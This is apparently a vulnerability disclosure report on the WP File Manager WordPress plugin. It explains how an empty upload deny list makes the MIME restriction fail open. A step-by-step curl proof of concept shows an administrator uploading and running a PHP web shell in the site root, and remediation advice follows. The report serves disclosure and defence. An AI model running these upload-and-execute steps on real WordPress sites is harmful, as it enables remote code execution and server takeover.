=== SOFTWARE DETAILS ===

Type of Software: WordPress Plugin

Software Name: WP File Manager

Software Slug: wp-file-manager

Affected Version(s): <= 8.0.6

=== VULNERABILITY DETAILS ===

Description of Vulnerability

The plugin's elFinder connector (mk_file_folder_manager_action_callback, file_folder_manager.php:1369+) mounts the whole WordPress root (ABSPATH) and configures its upload restrictions as follows (file_folder_manager.php:1454-1457):

    'uploadDeny'  => array(),                        // EMPTY deny list
    'uploadAllow' => array('image', 'text/plain'),   // the advertised restriction
    'uploadOrder' => array('deny', 'allow'),

elFinder's allowPutMime() (lib/php/elFinderVolumeDriver.class.php:4494) implements Apache's "Order deny,allow" semantics: when the first element of uploadOrder is 'deny', the DEFAULT decision is ALLOW, and the allow-list is only consulted to override an actual deny match. Since the plugin passes an EMPTY uploadDeny list, $deny is never true, and every MIME type is accepted — including text/x-php. The 'uploadAllow' restriction is therefore entirely non-functional (fail-open): the connector accepts and writes ANY file type into the web root.

Verified dynamically on WordPress 6.7.1 with WP File Manager 8.0.6 (administrator session on a live install): uploading a shell.php (Content-Type application/x-php, detected MIME text/x-php) through the connector's upload command with the plugin's own nonce succeeded — elFinder returned the added file with url http://TARGET/shell.php, and requesting that URL executed the PHP payload (response body: the payload's output). Uploading into ABSPATH means the file lands in the web root where the server executes .php.

On single-site installs the handler requires only 'manage_options' (any administrator). The uploadAllow restriction exists precisely to limit what the file manager can write — and it does not work: any deployment where the file-manager feature is operated at lower trust than full server control (the plugin's own Settings page advertises "Here admin can give access to user roles to use filemanager" — role-based access is the plugin's advertised feature set), or where a secondary vulnerability (XSS/CSRF on any admin action) reaches this endpoint, converts this fail-open filter into full Remote Code Execution.

Vulnerability Type: Unrestricted File Upload leading to Remote Code Execution (fail-open MIME restriction)

Impact Statement: Any user with access to the file manager endpoint (administrator on single-site; the uploadAllow restriction they are shown is non-functional) can upload a PHP file directly into the WordPress web root and execute arbitrary code, because the plugin's MIME allow-list is silently bypassed by its empty deny-list configuration.

Common Weakness (CWE) Type: CWE-434 (Unrestricted Upload of File with Dangerous Type) / CWE-636 (Range Comparison Without Minimum Check — fail-open)

Authentication Level Required: Administrator (single-site manage_options; manage_network on Multisite)

References to Affected Code:
- https://plugins.trac.wordpress.org/browser/wp-file-manager/trunk/file_folder_manager.php (mk_file_folder_manager_action_callback, ~line 1454: 'uploadDeny' => array() combined with 'uploadOrder' => array('deny','allow'))
- https://plugins.trac.wordpress.org/browser/wp-file-manager/trunk/lib/php/elFinderVolumeDriver.class.php (allowPutMime, line ~4494: Order-deny-allow semantics default to allow when the deny list never matches)

References:
- https://wordpress.org/plugins/wp-file-manager/
- CVE-2020-25213 (unauthenticated file upload via a separate symlink/missing-auth issue in the same connector) is unrelated and fixed; this finding concerns the authenticated connector's non-functional MIME restriction that remains in the current version.

=== PROOF OF CONCEPT ===

Prerequisites:
- WordPress 6.7.1, WP File Manager 8.0.6 activated
- Any administrator account (single-site)
- The plugin's page admin.php?page=wp_file_manager to obtain the wp-file-manager nonce (localized as fmfparams.nonce)

Step 1 — Log in and load the file manager page, capture the connector nonce:
curl -s -c cookies.txt -X POST "http://TARGET/wp-login.php" -d "log=admin&pwd=<pass>&wp-submit=Log+In&redirect_to=http://TARGET/wp-admin/admin.php%3Fpage%3Dwp_file_manager&testcookie=1"
NONCE=$(curl -s -b cookies.txt "http://TARGET/wp-admin/admin.php?page=wp_file_manager" | grep -oP 'fmfparams\s*=\s*\{[^}]*"nonce":"\K[a-f0-9]+')

Step 2 — Upload a PHP web shell to the site root through the connector (the advertised image/text-plain allow-list accepts text/x-php):
curl -s -b cookies.txt -H "Referer: http://TARGET/wp-admin/admin.php?page=wp_file_manager" \
  -F "cmd=upload" -F "_wpnonce=$NONCE" -F "target=l1_Lw" \
  -F "upload[]=@shell.php;type=application/x-php" \
  "http://TARGET/wp-admin/admin-ajax.php?action=mk_file_folder_manager"
Observed: {"added":[{"mime":"text\/x-php","name":"shell.php","url":"http://TARGET/shell.php",...}]} — the file was accepted despite the allow-list.

Step 3 — Execute the payload:
curl -s "http://TARGET/shell.php"
Observed: PWNED (the PHP payload executed; full RCE)

Negative control (what the working restriction would do): the same allowPutMime() logic with the two remediations below was evaluated — with 'uploadDeny' populated with the PHP MIME types, or with 'uploadOrder' => array('allow','deny'), the identical text/x-php upload is REJECTED. Only the shipped combination (empty deny + deny-first order) accepts every MIME type, confirming the fail-open.

Environment / Configuration Details: WordPress 6.7.1, PHP 8.2.34, WP File Manager 8.0.6 default settings (root = ABSPATH), administrator session; upload performed through admin-ajax.php action=mk_file_folder_manager with the plugin's own localized nonce and a same-origin Referer (the connector also enforces nonce + capability + same-origin — all legitimately satisfied by an administrator here; the MIME restriction is the only defense that fails, and it fails open).

Certify PoC tested step-by-step: YES

Did you use AI? YES

=== OTHER DETAILS ===

Have you requested a CVE from another CNA? NO
Have you reported this to another vendor? NO
Terms agreement: YES

=== SUGGESTED REMEDIATION ===

1. Populate 'uploadDeny' with dangerous types instead of relying on the allow-list: 'uploadDeny' => array('application/x-php','text/x-php','text/x-httpd-php','application/php','application/x-httpd-php','phar','phtml','cgi','exe','bat','sh','js','html','htaccess'), keeping 'uploadOrder' => array('deny', 'allow').
   OR switch the order to allow-first: 'uploadOrder' => array('allow','deny') with the existing uploadAllow — under allow-first semantics the default becomes deny and only image/text/plain pass.
2. Additionally reject any upload whose resolved path is inside ABSPATH and whose extension is executable by the web server, regardless of MIME.
3. Consider blocking executable-file writes in .htaccess-controlled directories via the existing restrictions array as defense in depth.
